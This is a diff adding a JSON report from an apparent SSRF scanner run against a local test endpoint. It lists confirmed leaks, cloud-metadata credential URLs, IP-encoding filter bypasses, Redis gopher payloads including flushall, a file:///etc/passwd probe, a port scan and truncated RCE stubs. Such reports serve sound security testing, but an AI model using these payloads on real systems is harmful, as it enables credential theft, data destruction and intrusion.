@@ -1,0 +1,220 @@
+{
+  "target": "http://127.0.0.1:8000/fetch",
+  "timestamp": "2026-10-12T19:14:15.671695Z",
+  "phases": {
+    "detection": {
+      "response_based": {
+        "confirmed": true,
+        "evidence": "[FETCHED http://127.0.0.1:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+      },
+      "time_based": {
+        "confirmed": true,
+        "delay": 5.00667667388916
+      },
+      "error_based": {
+        "confirmed": false
+      }
+    },
+    "cloud_metadata": {
+      "aws_imdsv1": {
+        "url": "http://169.254.169.254/latest/meta-data/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "aws_iam": {
+        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "aws_userdata": {
+        "url": "http://169.254.169.254/latest/user-data/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "gcp_base": {
+        "url": "http://metadata.google.internal/computeMetadata/v1/",
+        "hit": false,
+        "response_snippet": "[ERROR] ConnectionError: HTTPConnectionPool(host='metadata.google.internal', port=80): Max retries exceeded with url: /computeMetadata/v1/ (Caused by NameResolutionError(\"<urllib3.connection.HTTPConnection object at 0x7c9b518ec9a0>: Failed to resolve 'metadata.google.internal' ([Errno -2] Name or se"
+      },
+      "azure_base": {
+        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "digitalocean": {
+        "url": "http://169.254.169.254/metadata/v1/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "alibaba": {
+        "url": "http://100.100.100.200/latest/meta-data/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      },
+      "oracle": {
+        "url": "http://169.254.169.254/opc/v1/instance/",
+        "hit": false,
+        "response_snippet": "[TIMEOUT]"
+      }
+    },
+    "filter_bypass": {
+      "ip_encoding": [
+        {
+          "payload": "http://2130706433:8000/internal/secret",
+          "bypassed": true,
+          "status": 200,
+          "snippet": "[FETCHED http://2130706433:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+        },
+        {
+          "payload": "http://0177.0.0.1:8000/internal/secret",
+          "bypassed": true,
+          "status": 200,
+          "snippet": "[FETCHED http://0177.0.0.1:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+        },
+        {
+          "payload": "http://0x7f.0.0.1:8000/internal/secret",
+          "bypassed": true,
+          "status": 200,
+          "snippet": "[FETCHED http://0x7f.0.0.1:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+        },
+        {
+          "payload": "http://127.1:8000/internal/secret",
+          "bypassed": true,
+          "status": 200,
+          "snippet": "[FETCHED http://127.1:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+        }
+      ],
+      "ipv6": [
+        {
+          "payload": "http://[::1]:8000/internal/secret",
+          "bypassed": false,
+          "status": 200,
+          "snippet": "[ERROR] ConnectionError: HTTPConnectionPool(host='::1', port=8000): Max retries exceeded with url: /internal/secret (Caused by NameResolutionError(\"<u"
+        },
+        {
+          "payload": "http://[::ffff:127.0.0.1]:8000/internal/secret",
+          "bypassed": true,
+          "status": 200,
+          "snippet": "[FETCHED http://[::ffff:127.0.0.1]:8000/internal/secret]\n\nINTERNAL_SECRET_DATA: admin_token=abc123xyz\n"
+        }
+      ],
+      "url_parsing": [
+        {
+          "payload": "http://127.0.0.1:8000@example.com/",
+          "bypassed": false,
+          "status": 200,
+          "snippet": "[FETCHED http://127.0.0.1:8000@example.com/]\n\n<!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta name=viewport co"
+        },
+        {
+          "payload": "http://example.com#@127.0.0.1:8000/internal/secret",
+          "bypassed": false,
+          "status": 200,
+          "snippet": "[FETCHED http://example.com#@127.0.0.1:8000/internal/secret]\n\n<!doctype html><html lang=en><head><meta charset=utf-8><link rel=icon href=data:,><meta "
+        }
+      ],
+      "domain_parser": [
+        {
+          "payload": "http://127.0.0.1.nip.io:8000/internal/secret",
+          "bypassed": false,
+          "status": null,
+          "snippet": "[TIMEOUT]"
+        }
+      ]
+    },
+    "protocol_smuggling": {
+      "gopher_redis_info": {
+        "payload": "gopher://127.0.0.1:6379/_INFO",
+        "worked": false,
+        "snippet": "[ERROR] InvalidSchema: No connection adapters were found for 'gopher://127.0.0.1:6379/_INFO'\n"
+      },
+      "gopher_redis_flushall": {
+        "payload": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a",
+        "worked": false,
+        "snippet": "[ERROR] InvalidSchema: No connection adapters were found for 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a'\n"
+      },
+      "dict_redis": {
+        "payload": "dict://127.0.0.1:6379/INFO",
+        "worked": false,
+        "snippet": "[ERROR] InvalidSchema: No connection adapters were found for 'dict://127.0.0.1:6379/INFO'\n"
+      },
+      "file_passwd": {
+        "payload": "file:///etc/passwd",
+        "worked": false,
+        "snippet": "[ERROR] InvalidSchema: No connection adapters were found for 'file:///etc/passwd'\n"
+      }
+    },
+    "internal_scan": [
+      {
+        "host": "127.0.0.1",
+        "port": 22,
+        "state": "closed/filtered",
+        "elapsed": 0.005
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 80,
+        "state": "closed/filtered",
+        "elapsed": 0.006
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 443,
+        "state": "closed/filtered",
+        "elapsed": 0.009
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 3306,
+        "state": "closed/filtered",
+        "elapsed": 0.009
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 5432,
+        "state": "closed/filtered",
+        "elapsed": 0.005
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 6379,
+        "state": "closed/filtered",
+        "elapsed": 0.006
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 9200,
+        "state": "closed/filtered",
+        "elapsed": 0.008
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 8080,
+        "state": "closed/filtered",
+        "elapsed": 0.006
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 8443,
+        "state": "closed/filtered",
+        "elapsed": 0.007
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 27017,
+        "state": "closed/filtered",
+        "elapsed": 0.005
+      },
+      {
+        "host": "127.0.0.1",
+        "port": 8000,
+        "state": "OPEN",
+        "elapsed": 0.011
+      }
+    ],
+    "rce_payloads": {
+      "redis_rce_cron": "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...",
+      "redis_rce_ssh_key": "gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a...",
+      "mysql_udf_rce": "gopher://127.0.0.1:3306/_<template>"
+    }
+  }
+}
